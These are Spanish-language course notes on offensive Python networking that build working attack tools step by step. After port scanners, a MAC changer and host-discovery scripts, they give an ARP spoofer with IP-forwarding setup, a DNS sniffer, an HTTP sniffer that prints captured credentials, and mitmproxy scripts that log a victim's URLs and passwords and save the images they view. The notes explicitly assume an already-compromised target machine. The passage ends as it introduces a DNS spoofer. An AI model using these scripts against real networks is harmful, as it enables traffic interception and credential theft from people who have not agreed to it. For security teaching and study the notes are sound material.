-----
# Previo a la explotación

En esta clase, introduciremos los conceptos que vamos a estar viendo en esta sección del curso, donde orientaremos todo nuestro código al lado más oscuro y ofensivo en donde hacemos uso de todo lo aprendido anterior mente como: [[Programación Orientada a Objetos]], [[Biblioteca Estándar y Herramientas Adicionales]], [[Módulos y Paquetes]] y el [[Manejo de Librerías]] .

Una parte significativa de esta sección se dedicará al uso de **Scapy**, una poderosa biblioteca de Python diseñada para la manipulación y control de paquetes de red. A través de Scapy, aprenderemos cómo inspeccionar, modificar e incluso crear paquetes de red, lo que nos permitirá entender mejor cómo fluye la información a través de Internet y cómo pueden ser explotadas las vulnerabilidades en los protocolos de red.

Además, exploraremos el uso de **NetfilterQueue**, una herramienta que nos permitirá interceptar y manipular paquetes de red en un sistema Linux, trabajando en conjunto con **iptables** para aplicar reglas de filtrado y redirección de tráfico. Esta combinación de herramientas nos ofrecerá una comprensión práctica de cómo los ataques pueden ser dirigidos y cómo podemos defender nuestras redes contra ellos.

Otro componente clave de esta sección del curso será **Mitmproxy**, un proxy de interceptación que nos permitirá observar, modificar y jugar con el tráfico HTTP/HTTPS. A través de Mitmproxy, entenderemos mejor los ataques de ‘**man-in-the-middle**‘ (**MitM**), una técnica comúnmente utilizada por los atacantes para interceptar y alterar la comunicación entre dos partes sin que ellas lo sepan.

Al final de esta sección, tendréis una comprensión detallada no solo de cómo se emplean las herramientas de hacking, sino también de cómo crear vuestras propias herramientas personalizadas. Estaréis equipados con los conocimientos necesarios para diseñar y desarrollar herramientas de hacking orientadas específicamente al descubrimiento y explotación de vulnerabilidades en sistemas y redes.

Este enfoque práctico y centrado en la creación os permitirá entender profundamente los mecanismos detrás de los ataques cibernéticos y cómo las vulnerabilidades pueden ser identificadas y explotadas. Este conocimiento es esencial para cualquier profesional de la seguridad informática que busca proteger eficazmente sus sistemas y redes contra atacantes maliciosos, proporcionando una base sólida para el desarrollo de estrategias de defensa más avanzadas y personalizadas.

# Creando un Escáner de Puertos

Durante el desarrollo de estas clases, nos centraremos en la creación de un escáner de puertos. Una característica clave será la implementación de ‘**threading**‘ para acelerar el proceso de escaneo. Aprenderemos a utilizar ‘**ThreadPoolExecutor**‘ para gestionar y limitar los hilos, evitando así errores comunes como el exceso de conexiones máximas.

Además, integraremos ‘**argparse**‘ en nuestra herramienta, lo que nos permitirá personalizar las opciones de ejecución. Este enfoque nos dará una comprensión más profunda de cómo optimizar el rendimiento y la eficiencia de nuestras herramientas de seguridad en red, manteniendo un equilibrio entre velocidad y estabilidad.

V1:

```python
#!/usr/bin/env python3

import socket

host = "192.168.1.254"
port = 80

def port_scanner(port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera

    # recordemos que el 0 es igual a false y el 1 es igual a true en booleano
    if not s.connect_ex((host, port)): # connect_ex nos devuelve dos valores -> 111(si el puerto esta cerrado) y 0(si el puerto esta abierto)
        print(f"\\n[+] El puerto {port} esta Abierto")

    else:
        print(f"\\n[+] El puerto {port} esta Cerrado")

    s.close()

def main():

    port_scanner(port)

if __name__ == "__main__":
    main()

```

V2:

```python
#!/usr/bin/env python3

import socket

host = input(f"Introduce la dirección ip: ")
port = int(input("Introduce el puerto a escánear: "))

def port_scanner(port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera

    # recordemos que el 0 es igual a false y el 1 es igual a true en booleano
    if not s.connect_ex((host, port)): # connect_ex nos devuelve dos valores -> 111(si el puerto esta cerrado) y 0(si el puerto esta abierto)
        print(f"\\n[+] El puerto {port} esta Abierto")

    else:
        print(f"\\n[+] El puerto {port} esta Cerrado")

    s.close()

def main():

    port_scanner(port)

if __name__ == "__main__":
    main()

```

V3:

```python
#!/usr/bin/env python3

import socket
from termcolor import colored

host = input(f"Introduce la dirección ip: ")

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera
    return s

def port_scanner(s, port):

    try:
        s.connect((host,port))
        print(colored(f"[+] El puerto {port} esta Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs
        s.close() # cerramos el socket

    except (socket.timeout, ConnectionRefusedError): # El primero es si el tiempo se acava, el segundo si la conexión no se logra
        s.close() # cerramos el socket

def main():
    
    for port in range(1, 1000):
        s = create_socket() # creamos el socket
        port_scanner(s, port)

if __name__ == "__main__":
    main()
```

V4:

```python
#!/usr/bin/env python3

import socket
import argparse # nos ayuda a crear un menu
from termcolor import colored
import sys

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # iniciamos la clase y le damos una descripción
    parser.add_argument("-t", "--targer", dest="target", help="Victim target to scan (Ex: -t 192.168.0.1)") # con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable target descrita en dest, la variable no es nesesario declararla.
    parser.add_argument("-p", "-ports", dest="port", help="Ports range to scan (Ex: -p 1-100)" )
    
    options = parser.parse_args() # Nos pemite instanciár una especie de objeto en el cual encontraremos un metodo con el nombre del parametro que definimos, en este caso target

    if options.target is None or options.port is None:
        parser.print_help()
        sys.exit(1)

    return options.target, options.port

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera
    return s

def port_scanner(s, port, host):

    try:
        s.connect((host,port))
        print(colored(f"[+] El puerto {port} esta Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs
        s.close() # cerramos el socket

    except (socket.timeout, ConnectionRefusedError): # El primero es si el tiempo se acava, el segundo si la conexión no se logra
        s.close() # cerramos el socket

def main():

    target,ports= get_arguments()

    if '-' in ports:
        ports = ports.split('-')

    for port in range(int(ports[0]), int(ports[1])):
        s = create_socket() # creamos el socket
        port_scanner(s, port, target)

if __name__ == "__main__":
    main()
```

V5, optimización del código:

```python
#!/usr/bin/env python3

import socket
import argparse # nos ayuda a crear un menu
from termcolor import colored
import sys

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # iniciamos la clase y le damos una descripción
    parser.add_argument("-t", "--targer", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.0.1)") # con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable target descrita en dest, la variable no es nesesario declararla.
    parser.add_argument("-p", "-ports", dest="port", required=True,help="Ports range to scan (Ex: -p 1-100)" ) # usamos required para decirle a python que el panel es requerido
    options = parser.parse_args() # Nos pemite instanciár una especie de objeto en el cual encontraremos un metodo con el nombre del parametro que definimos, en este caso target

    return options.target, options.port 

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera
    return s

def port_scanner(s, port, host):

    try:
        s.connect((host,port)) # Generamos la conexión
        print(colored(f"[+] El puerto {port} esta Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs
        s.close() # cerramos el socket

    except (socket.timeout, ConnectionRefusedError): # El primero es si el tiempo se acava, el segundo si la conexión no se logra
        s.close() # cerramos el socket

def parse_ports(ports_str):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-')) # recordemos que con map podemos hacer parse a iterbles
        return range(start, end+1) # devolvemos end+1 porque recordemos que con range es desde n hasta n-1

    elif ',' in ports_str:
        return map(int, ports_str.split(',')) # Retornamos directamente map ya que es un iterable

    else:
        return (int(ports_str),) # generamos una tupla de un unico elemento

def scan_ports(ports, target):

    for port in ports:
        s = create_socket() # generamos un socket
        port_scanner(s, port, target)

def main():

    target,ports_str= get_arguments()
    ports = parse_ports(ports_str)
    scan_ports(ports, target)

if __name__ == "__main__":
    main()
```

V6 Usando Hilos para mejorar la velocidad:

```python
#!/usr/bin/env python3

import socket
import argparse # nos ayuda a crear un menu
from termcolor import colored
import threading

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # iniciamos la clase y le damos una descripción
    parser.add_argument("-t", "--targer", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.0.1)") # con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable target descrita en dest, la variable no es nesesario declararla.
    parser.add_argument("-p", "-ports", dest="port", required=True,help="Ports range to scan (Ex: -p 1-100)" ) # usamos required para decirle a python que el panel es requerido
    options = parser.parse_args() # Nos pemite instanciár una especie de objeto en el cual encontraremos un metodo con el nombre del parametro que definimos, en este caso target

    return options.target, options.port 

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera
    return s

def port_scanner(port, host):

    s = create_socket() # generamos un socket

    try:
        s.connect((host,port)) # Generamos la conexión
        print(colored(f"[+] El puerto {port} esta Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs
        s.close() # cerramos el socket

    except (socket.timeout, ConnectionRefusedError): # El primero es si el tiempo se acava, el segundo si la conexión no se logra
        s.close() # cerramos el socket

def parse_ports(ports_str):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-')) # recordemos que con map podemos hacer parse a iterbles
        return range(start, end+1) # devolvemos end+1 porque recordemos que con range es desde n hasta n-1

    elif ',' in ports_str:
        return map(int, ports_str.split(',')) # Retornamos directamente map ya que es un iterable

    else:
        return (int(ports_str),) # generamos una tupla de un unico elemento

def scan_ports(ports, target):

    threads = [] #Creamos una lista para almacenar los thread

    for port in ports:
        thread = threading.Thread(target=port_scanner, args=(port, target)) # creamos y configuramos el thread
        threads.append(thread) # almacenamos los thread en nuestra lista
        thread.start() # Iniciamos los threads

    for thread in threads:
        thread.join() # Cerramos los threas una ves estos terminen usando la lista que definimos

def main():

    target,ports_str= get_arguments()
    ports = parse_ports(ports_str)
    scan_ports(ports, target)

if __name__ == "__main__":
    main()
```

V7 implementando ThreadPoolExecutor para enviar hilos por tandadas e implementando un manejador de señales:

```python
#!/usr/bin/env python3

import sys
import signal # modulo que nos ayuda a manejar las señales por teclado
import socket
import argparse # nos ayuda a crear un menu
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

open_sockets = [] # Lista la cual nos ayuda a almacenar sockets

def def_handler(sig, frame): # Cuando acojemos una señal esta debuelve dos valores los cuales recivimos en sig que es un idetificador de señal y frame que es el punto en donde se encontraba la ejecución del programa

    print(colored(f"\\n[!] Saliendo del programa.....", 'red'))

    for socket in open_sockets: # como la salida va a ser forsada tenemos que usar los sockets que almacenamos para cerrarlos
        socket.close() # cerramos los sockets que estamos usando

    sys.exit(1) # Realizamos un exit con estado 1

signal.signal(signal.SIGINT, def_handler) # Cuando aplastemos CTRL+C se llamara a la función def_handler

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # iniciamos la clase y le damos una descripción
    parser.add_argument("-t", "--targer", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.0.1)") # con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable target descrita en dest, la variable no es nesesario declararla.
    parser.add_argument("-p", "-ports", dest="port", required=True,help="Ports range to scan (Ex: -p 1-100)" ) # usamos required para decirle a python que el panel es requerido
    options = parser.parse_args() # Nos pemite instanciár una especie de objeto en el cual encontraremos un metodo con el nombre del parametro que definimos, en este caso target

    return options.target, options.port 

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # iniciamos la varible socket
    s.settimeout(0.2) # Con esto Nosotros podemos definir un tiempo de espera

    open_sockets.append(s) # agregamos el socket que creamos a nuestra lista de open_sockets

    return s

def port_scanner(port, host):

    s = create_socket() # generamos un socket

    try:
        s.connect((host,port)) # Generamos la conexión
        s.sendall(b"HEAD / HTTP/1.1\\r\\n\\r\\n")
        response = s.recv(1024).decode(errors='ignore').split("\\n")

        if response:
            print(colored(f"[+] El puerto {port} esta Abierto\\n", "green"))

            for line in response:
                print(colored(f"{line}", 'grey'))

        else:
            print(colored(f"[+] El puerto {port} esta Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs

    except (socket.timeout, ConnectionRefusedError): # El primero es si el tiempo se acava, el segundo si la conexión no se logra
        pass
    finally:
        s.close()

def parse_ports(ports_str):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-')) # recordemos que con map podemos hacer parse a iterbles
        return range(start, end+1) # devolvemos end+1 porque recordemos que con range es desde n hasta n-1

    elif ',' in ports_str:
        return map(int, ports_str.split(',')) # Retornamos directamente map ya que es un iterable

    else:
        return (int(ports_str),) # generamos una tupla de un unico elemento

def scan_ports(ports, target):

    with ThreadPoolExecutor(max_workers=250) as executor: # con ayuda de with podemos emplementar ThreadPoolExecutor y pasarle el maximo de hilos en paralelo con max_workers
        executor.map(lambda port: port_scanner(port, target), ports) # executor que referncia a ThreadPoolExecutor llamamos a map que nos permite iterar--
        #sobre un iterable y pasarle 1 por 1 los valores a la función, pero solo nos permite pasarle un valor, espor esto que a través de una función lambda nosotros--
        # enviamos a la misma una función como require map pero dentro de esta lambda llama a nuestra función port_scanner y envia uno por uno los puertos

def main():

    target,ports_str= get_arguments()
    ports = parse_ports(ports_str)
    scan_ports(ports, target)

if __name__ == "__main__":
    main()
```

# Creando un programa que nos cambie la dirección Mac

En esta clase, te guiaremos a través del proceso de creación de una herramienta en Python que te permitirá cambiar la dirección MAC de una interfaz de red. Aprenderás a programar desde cero esta funcionalidad, explorando conceptos clave y técnicas de programación que te serán útiles no solo para este proyecto, sino también en otros aspectos de la ciberseguridad.

Esta herramienta personalizada te dará un mayor entendimiento de cómo las direcciones MAC funcionan y cómo se pueden manipular para diversos propósitos en el mundo de la seguridad informática.

```python
#!/usr/bin/env python3

import argparse # nos ayuda a crear un panel para la ejecución del programa
import re # esto nos ayuda con el uso de expreciones regulares
import subprocess # para la ejecución de comandos controlada
from termcolor import colored # Jugamos con colores
import signal # Para la detección de comandos por teclado
import sys # Para la ejecución de comandos

def def_handler(sig, frame):

    print(colored(f"\\n[!] Cerrando el programa.....\\n", 'red'))
    sys.exit(1)

sig = signal.signal(signal.SIGINT, def_handler) # controlamos la salida con CTRL+C

def get_arguments():

    parser = argparse.ArgumentParser(description="Change Mac on interface wirles") # creamos una instacia para el panel y le padamos una descripción
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="nombre de la interfas de red") # Agregamos un parametro
    parser.add_argument("-m", "--mac", required=True, dest="mac_addres", help="Nueva dirección Mac para la interfaz de red") # Agregamos otro parametro

    return parser.parse_args() # retornamos el objeto que contiene los argumentos como metodos

def is_valid_input(interface, mac_addres):

    is_valid_interface = re.match(r"^[a-z][a-z][a-z]\\d{1,2}$", interface) # Para validar el formato creamos una expreción regular y la verificamos con match \\d es de digitos y {1,2} uno o dos digitos
    is_valid_mac_addres = re.match(r'^([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}$', mac_addres) # el [a-z]es el rango y {2} es el numero de veses que se repite

    return is_valid_interface and is_valid_mac_addres # retornamos si los dos no son NONE

def change_mac(interface, mac_addres):

    if is_valid_input(interface, mac_addres):

        # ejecutamos los comandos con subprocess para evitar inyección de comandos
        subprocess.run(["ifconfig", interface, "down"])
        subprocess.run(["ifconfig", interface, "hw", "ether", mac_addres])
        subprocess.run(["ifconfig", interface, "up"])

        print(colored(f"\\n[+] La Mac a sido cambiada exitosamente\\n", 'green'))

    else:
        print(colored(f"\\n[!] Los datos son incorrectos\\n", 'red'))

def main():
    args = get_arguments() # recivimos el objeto que contiene los parametros

    change_mac(args.interface, args.mac_addres) # enviamos el contenido de los parametros mediate sus metodos

if __name__ == "__main__":
    main()
```

# Creando Escáner de Red
## ICMP

En esta clase, abordaremos el desarrollo de un escáner de red utilizando el protocolo ICMP, todo ello a través de Python. Te enseñaremos cómo programar un escáner eficiente y confiable que pueda detectar dispositivos activos en una red. Cubriremos los fundamentos del protocolo ICMP y cómo se utiliza en el escaneo de redes, proporcionando conocimientos prácticos y teóricos.

Al final de esta clase, tendrás una herramienta poderosa en tu arsenal de ciberseguridad, la cual te permitirá realizar diagnósticos de red y entender mejor la estructura de las redes a las que te enfrentes.

```python
#!/usr/bin/env python3

import argparse
import re
import subprocess
import signal
import sys
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def def_handler(sig, frame): 
    print(colored(f"[!] Saliendo......", 'red'))
    sys.exit(1)

sig = signal.signal(signal.SIGINT, def_handler) # Controlamos la salida CTRL + C

def get_arguments():

    parser = argparse.ArgumentParser(description="Herramienta para descubrir hosta activos en una red") # instanciamos una clase y definimos su descripción
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host o rango de red a escanear") # agregamos un argumento

    args = parser.parse_args() # Definimos un objeto pasandole todos los argumentos

    return args.target

def validation_format(target_str):

    if "/" in target_str:
        valid_input = re.match(r"^(\\d{1,3}\\.){3}\\d{1,3}\\/\\d{1,3}$", target_str)
        return valid_input
    else:
        valid_input = re.match(r"^(\\d{1,3}\\.){3}\\d{1,3}$", target_str)
        return valid_input

def parse_target(target_str):

    if validation_format(target_str):

        target_str_split = target_str.split('.')
        target = '.'.join(target_str_split[:3]) + "."

        if "/" in target_str_split[3]:
            start, end = target_str_split[3].split("/")
            return [f"{target}{i}" for i in range(int(start), int(end)+1)]

        else:
            return [target_str]

    else:
        print(colored(f"\\n[!] El formato no es valido......", 'red'))
        sys.exit(1)

def host_discovery(target):

    try:
        ping = subprocess.run(["ping", "-c", "1", target], timeout=1, stdout=subprocess.DEVNULL) # con timeout definimos el tiempo de espera
        if ping.returncode == 0:
            print(colored(f"El Host: {target} - Activo", 'green'))

    except subprocess.TimeoutExpired:
            pass

def main():

    target_str = get_arguments()
    targets = parse_target(target_str)

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(host_discovery, targets)

if __name__ == "__main__":
    main()
```

## ARP

En esta clase, nos enfocaremos en la creación de un escáner de red basado en el protocolo ARP, utilizando la poderosa biblioteca de Python, **Scapy**.

**Scapy** es una herramienta increíblemente versátil para la manipulación y análisis de paquetes en redes, y es fundamental en el campo de la ciberseguridad. Aprenderás cómo utilizar Scapy para construir un escáner ARP desde cero, lo que te permitirá identificar dispositivos en una red local. Este escáner será una herramienta esencial para entender cómo los dispositivos se comunican en una red.

Al finalizar la clase, tendrás un conocimiento práctico de Scapy y del protocolo ARP, así como una herramienta útil para el análisis de redes.

```python
#!/usr/bin/env python3

import scapy.all as scapy # los metodos que usamos solo son validos usando root
import argparse

def get_arguments():

    parser = argparse.ArgumentParser(description="Host Scan ARP")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host / IP range to Scan")

    args = parser.parse_args()

    return args.target

def scan(ip):
    # construyendo un packete valido de red
    arp_packet = scapy.ARP(pdst=ip) # construimos la trama arp
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # construimos la trama ethernet

    arp_packet = broadcast_packet/arp_packet # no estamos dividiendo, sino estos componiendo o uniendo las dos especificadas
    answered, unanswered = scapy.srp(arp_packet, verbose=False, timeout=1) # Esto nos permite enviar un packete a la red y devulve dos valores, los que responden y los que no
    
    response = answered.summary() # a través de summary logramo obtener todas las respuestas cuando enviamos los packetes

    if response:
        print(response)

def main():

    target = get_arguments()
    scan(target)

if __name__ == "__main__":
    main()
```

## **Creando un envenenador ARP (ARP Spoofer) con Scapy**

En esta clase, nos centraremos en la creación de un envenenador ARP (**ARP Spoofer**) utilizando Scapy, una herramienta esencial de Python para el análisis y manipulación de paquetes de red. El ARP Spoofing es una técnica de ataque en redes donde un atacante envía mensajes ARP falsificados en una red local. Esto se hace para asociar la dirección MAC del atacante con la dirección IP de otro dispositivo, como un servidor o un gateway, lo que permite al atacante interceptar el tráfico entre dos sistemas.

El concepto de **Man-In-The-Middle** (**MITM**) es crucial aquí, ya que el atacante se posiciona estratégicamente entre dos partes para interceptar o modificar el tráfico de datos, una táctica común en ataques cibernéticos. Esta técnica es posible debido a la naturaleza de confianza del protocolo ARP, que no verifica si las respuestas a las solicitudes ARP son legítimas.

Durante la clase, exploraremos cómo Scapy puede ser utilizado para implementar este tipo de ataque, proporcionando una comprensión profunda de cómo funciona el ARP Spoofing y por qué es una amenaza significativa en las redes. Esta experiencia práctica te dotará de las habilidades necesarias para identificar y prevenir estos ataques en entornos reales, fortaleciendo tu comprensión y habilidades en ciberseguridad.

Primero tenemos que ejecutar comando el cual nos permitirá redirigir las peticiones:

```bash
iptables --policy FOWARD ACCEPT
```

Lo siguiente es modificar el archivo: /proc/sys/net/ipv4/ip_forward, y cambiar el contenido el cual debe ser un 0 por un 1.

```python
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

ya con esto podemos comenzar:

```python
#!/usr/bin/env pytho3

import argparse
import time
import scapy.all as scapy

def get_arguments():

    parse = argparse.ArgumentParser(description="Arp Spoofer")
    parse.add_argument("-t", "--target", required=True, dest="victim", help="Host / IP Range to Spoofer") 
    parse.add_argument("-r", "--router", required=True, dest="router", help="Host / IP Range to Spoofer")

    return parse.parse_args()

def spoof(ip_addres, router):

    arp_packet = scapy.ARP(op=2, psrc=router, pdst=ip_addres, hwsrc="aa:bb:cc:44:55:66") # Cuando op vale 1 es una solicitud, pero cuando vale 2 es una respuesta, psrc(para el destino) y pdst es el origen y en hwsrc(para especificar la mac)
    scapy.send(arp_packet, verbose=False) # solo enviamos el packete

def main():
    
    arguments = get_arguments()
    while True:
        spoof(arguments.victim, arguments.router) # este es para la maquina victima para que crea que somos el router
        spoof(arguments.router, arguments.victim) # este es para el router, que crea que somos la maquina victima

        time.sleep(2)

if __name__ == "__main__":
    main()
```

## **Creando un rastreador de consultas DNS (DNS Sniffer) con Scapy**

En esta clase, nos centraremos en la creación de un rastreador de consultas DNS (DNS Sniffer) utilizando Scapy, una herramienta de Python orientada a la manipulación de paquetes de red para propósitos ofensivos. Un DNS Sniffer es una herramienta ofensiva que permite interceptar y analizar las consultas DNS en una red. Estas consultas son esenciales en la comunicación de Internet, ya que convierten nombres de dominio en direcciones IP.

Con Scapy, aprenderás a capturar paquetes DNS de forma activa para explorar cómo los dispositivos en una red interactúan con servidores DNS. Este conocimiento es crucial en el contexto ofensivo, ya que permite identificar objetivos potenciales para ataques y explotar vulnerabilidades en la comunicación DNS.

Durante la clase, te mostraremos cómo se pueden utilizar estas técnicas para reunir información valiosa sobre una red y sus usuarios, lo que puede ser utilizado en diversas estrategias de ataque. Al final de esta sesión, habrás desarrollado una herramienta ofensiva clave que te permitirá realizar reconocimientos avanzados y explotar debilidades en la gestión de DNS dentro de una red.

```python
#!/usr/bin/env python3

import scapy.all as scapy
import argparse

def process_dns_packet(packet):

    if packet.haslayer(scapy.DNSQR):
        domain = packet[scapy.DNSQR].qname.decode()

        exclude_keywords = ["google", "cloud", "bing", "static"]

        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords):
            domains_seen.add(domain)
            print(f"[+] Dominio: {domain}")

def main():

    global domains_seen
    domains_seen = set()

    interface = "eth0"
    print(f"\\n[+] Interceptando packetes de la maquina víctima:\\n")
    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)
    # con ayuda de sniff pasamos iface(interfas de red) filter(por lo que se va a filtrar) prn(llamada a una funció a la cual envia el packete) y store(para especificar si se almacena o no la información)

if __name__ == "__main__":
    main()
```
## **Creando un rastreador de consultas HTTP (HTTP Sniffer) con Scapy**

En esta clase, desarrollaremos un rastreador de consultas HTTP (HTTP Sniffer) enfocado en técnicas ofensivas. El HTTP Sniffer es una herramienta crucial para interceptar y analizar el tráfico HTTP en una red, lo que permite revelar información crítica como cabeceras HTTP, URLs solicitadas, y posiblemente datos de formularios y cookies. Estos datos son esenciales para comprender la comunicación entre clientes y servidores web, y pueden ser explotados para varios tipos de ataques, incluyendo la inyección de código, el secuestro de sesiones y la recopilación de información sensible.

A lo largo de la clase, te enseñaremos cómo capturar de manera efectiva este tipo de tráfico utilizando Scapy, y cómo analizarlo para identificar puntos débiles y oportunidades de ataque en una red. Esta habilidad es invaluable para cualquier estrategia ofensiva en ciberseguridad, proporcionándote un entendimiento profundo de cómo fluye la información en la web y cómo puede ser manipulada para fines de ataque.

```Python
#!/usr/bin/env python3

from matplotlib.cm import ColormapRegistry
import scapy.all as scapy
from scapy.layers import http # para poder usar http
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo........\n", 'red'))
    sys.exit(1)


sig = signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    cred_keywords = ["login", "user", "pass", "password", "username", "email", "name"] # es una lista de posibles datos en las solicitudes

    if packet.haslayer(http.HTTPRequest): # si el packet tiene la capa (http.HTTPRequest) entonces

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode() # estamos usando los parametros tanto de Host como de Pat para construir la url

        print(colored(f"\n[+] Url visitada por la victima: {url}", 'blue'))

        if packet.haslayer(scapy.Raw): # pedimos la capa raw ya que esta esta obteniendo información de uusarios

            # Usamos exepciones para manejar erroes al interceptar
            try:
                response = packet[scapy.Raw].load.decode() # tratamos a packet como una lista y le pedimos el packete scapy.raw y con .load lo obtenemos y .decode para que este en texto plano

                for keyword in cred_keywords: # con el bucle y el condicional devajo buscamos solicitudes que contengan cualquier palabra de la lista ya la muestren
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}", 'green'))
                        break
            except:
                pass


def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0) # Nos permite interceptar trafico que biene de una interfas de red


def main():
    sniff("eth0")


if __name__ == "__main__":
    main()
```
## **Creando un rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump**

En esta clase, vamos a sumergirnos en el mundo del espionaje de tráfico HTTPS creando un rastreador de consultas HTTPS (HTTPS Sniffer) con **mitmdump**. **Mitmdump** es una herramienta potente que actúa como un proxy, permitiéndonos interceptar, modificar y analizar el tráfico entre un cliente y un servidor, tanto para HTTP como para HTTPS.

El desafío con el tráfico HTTPS, que está cifrado para proteger la privacidad y seguridad de los datos, es que no se puede leer directamente. Aquí es donde entra en juego la instalación de un certificado en la máquina víctima. Al hacer esto, engañamos al dispositivo para que confíe en nuestro proxy, lo que nos permite descifrar y acceder al contenido del tráfico HTTPS.

Para esta clase, partimos de la base de que ya hemos vulnerado la máquina objetivo. Configuraremos mitmdump para que actúe como un proxy en nuestro equipo, redireccionando así el tráfico de la máquina víctima a través de nuestro sistema. Esto nos da un punto de observación privilegiado para examinar las comunicaciones seguras, una técnica de gran valor en el ámbito ofensivo de la ciberseguridad. Te guiaremos paso a paso en la configuración y el uso de esta herramienta, proporcionándote una habilidad clave para analizar y explotar las comunicaciones seguras en redes.

En esta ocasión vamos a hacer uso de lo que es mitmproxy podemos descargar los binarios de la web.
Tenemos que saber que para hacer todo esto ya tenemos que haber ganado acceso de la maquina victima y haber escalado privilegios.

Ya con eso tenemos que ejecutar el mitmweb e instalar en la maquina victima el certificado para evitar que en esta nos de el error. y ya con esto echo vamos a ejecutar mitmproxy para poder ver el trafico de la victima.

```python
#!/usr/bin/env python3

from mitmproxy import http
from urllib.parse import urlparse


def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    url =  packet.request.url
    parsed_url = urlparse(url)

    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    print(f"[+] URL visitada por la victima: {scheme}://{domain}{path}")

    keywords = ["user", "pass", "password", "username"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        print(f"[+] Posibles credenciales capturadas: \n{data}\n")
```

## **Creando un rastreador de imágenes por HTTPS (HTTPS Image Snfifer) con mitmdump**

En esta clase, vamos a construir un rastreador de imágenes por HTTPS usando mitmdump, conocido como **HTTPS Image Sniffer**. Tras haber establecido una configuración de Man-In-The-Middle (MITM) con mitmdump, el objetivo ahora es desarrollar una herramienta que nos permita capturar y visualizar en tiempo real todas las imágenes que un usuario ve en las páginas web que visita.

Este enfoque se centra en el tráfico de imágenes a través de conexiones HTTPS. Con la máquina víctima ya bajo nuestro control y mitmdump operando como proxy, podremos filtrar y captar específicamente las imágenes, proporcionándonos una visión única de la actividad visual del usuario en la web. Este conocimiento y habilidad práctica son vitales en operaciones ofensivas de ciberseguridad, especialmente en tareas de inteligencia y recolección de información.

```python
#!/usr/bin/env python3

from mitmproxy import http

def response(packet):

    content_type = packet.response.headers.get("content-type", "")

    try:
        if "image" in content_type:
            url = packet.request.url
            extension = content_type.split("/")[-1]

            if extension == "jpeg":
                extension = "jpg"

            file_name = f"images/{url.replace('/', '_').replace(':', '_')}.{extension}"
            image_data = packet.response.content

            with open(file_name, "wb") as f:
                f.write(image_data)

            print(f"[+] Imagen guardada: {file_name}")

    except:
        pass
```

## **Creando un DNS Spoofer con Scapy y NetfilterQueue**

En esta clase, vamos a crear un DNS Spoofer utilizando Scapy y NetfilterQueue. Este proyecto se centra en manipular las solicitudes DNS de una red para redirigir el tráfico a un destino elegido por nosotros, como atacantes.

La herramienta clave aquí es **iptables**, una utilidad de línea de comandos en sistemas Linux que permite configurar las reglas del firewall del sistema operativo. Usaremos iptables para redirigir todo el tráfico DNS (normalmente en el puerto 53) a una cola NFQUEUE. NFQUEUE es una funcionalidad de iptables que nos permite interceptar paquetes de la red, procesarlos con un programa externo (en este caso, nuestro DNS Spoofer creado con Scapy) y luego decidir si aceptarlos, descartarlos o modificarlos.

